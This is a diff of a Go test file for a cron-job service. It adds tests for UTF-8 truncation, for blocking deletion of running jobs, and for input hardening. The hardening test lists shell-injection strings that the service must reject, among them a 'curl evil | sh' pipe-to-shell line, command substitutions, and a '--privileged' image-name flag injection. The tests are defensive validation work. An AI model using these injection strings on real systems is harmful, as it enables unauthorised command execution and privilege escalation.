@@ -6,9 +6,12 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 
 	"github.com/glebarez/sqlite"
 	"gorm.io/gorm"
+
+	"github.com/custos-machina/backend/internal/modules/resources"
 )
 
 func testDB(t *testing.T) *gorm.DB {
@@ -350,7 +353,7 @@ func TestScanDueDispatchAndMissed(t *testing.T) {
 func TestMarkDanglingUnknown(t *testing.T) {
 	svc, _ := newSvc(t)
 	svc.db.Create(&CronRun{JobID: 1, Trigger: TriggerSchedule, Status: RunRunning, StartedAt: time.Now()})
-	svc.markDanglingUnknown()
+	svc.recoverDangling()
 	var got CronRun
 	svc.db.First(&got, 1)
 	if got.Status != RunUnknown {
@@ -364,7 +367,7 @@ func TestExecuteTimeoutKills(t *testing.T) {
 	svc, r := newSvc(t)
 	r.blockRuns = map[string]bool{"__never__": true} // 不用 block：超时由 errOn 模拟
 	r.errOn = "docker run"
-	r.err = fmt.Errorf("命令超时（600ms）")
+	r.err = fmt.Errorf("%w（600ms）", resources.ErrCommandTimeout) // 哨兵包装，与真实 sshRunOutput 一致
 	sc := mustScript(t, svc, ScriptShell)
 	job := &CronJob{ScriptID: sc.ID, ServerID: 1, Carrier: CarrierRun,
 		Image: "alpine:3", TimeoutSecs: 1, Name: "t"}
@@ -390,3 +393,56 @@ func TestExecuteTimeoutKills(t *testing.T) {
 }
 
 func boolPtr(b bool) *bool { return &b }
+
+// Command 注入面：shell 元字符拒绝；@every 多段时长；镜像前导 - 拒绝。
+func TestCronInputHardening(t *testing.T) {
+	svc, _ := newSvc(t)
+	sc := mustScript(t, svc, ScriptShell)
+	ctx := context.Background()
+
+	for _, badCmd := range []string{"; curl evil | sh", "`id`", "$(id)", "a && b", "a || b"} {
+		_, err := svc.SaveJob(ctx, 0, JobInput{
+			Name: "j", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+			Carrier: CarrierRun, Image: "alpine:3", Command: badCmd,
+		}, "t")
+		if err == nil {
+			t.Errorf("Command %q 应被拒绝", badCmd)
+		}
+	}
+	// 多段 @every 合法
+	if _, err := parseSchedule("@every 1h30m", time.Now()); err != nil {
+		t.Errorf("多段 @every 应合法: %v", err)
+	}
+	// 前导 - 镜像拒绝（--privileged 注入）
+	_, err := svc.SaveJob(ctx, 0, JobInput{
+		Name: "j2", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Carrier: CarrierRun, Image: "--privileged",
+	}, "t")
+	if err == nil {
+		t.Error("前导 - 的镜像名应被拒绝")
+	}
+}
+
+// truncateUTF8 不切碎多字节字符。
+func TestTruncateUTF8(t *testing.T) {
+	s := strings.Repeat("中", 40*1024) // 120KB 全多字节
+	got := truncateUTF8(s, 64*1024)
+	if len(got) > 64*1024+64 {
+		t.Fatalf("截断后超长: %d", len(got))
+	}
+	if !utf8.ValidString(got) {
+		t.Fatal("截断结果必须是合法 UTF-8")
+	}
+}
+
+// 删除运行中的任务被拒绝。
+func TestDeleteJobBlockedWhileRunning(t *testing.T) {
+	svc, _ := newSvc(t)
+	sc := mustScript(t, svc, ScriptShell)
+	svc.db.Create(&CronJob{ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Carrier: CarrierRun, Image: "alpine:3", Name: "j"})
+	svc.db.Create(&CronRun{JobID: 1, Status: RunRunning, StartedAt: time.Now()})
+	if err := svc.DeleteJob(context.Background(), 1); err == nil {
+		t.Error("运行中的任务删除应被拒绝")
+	}
+}
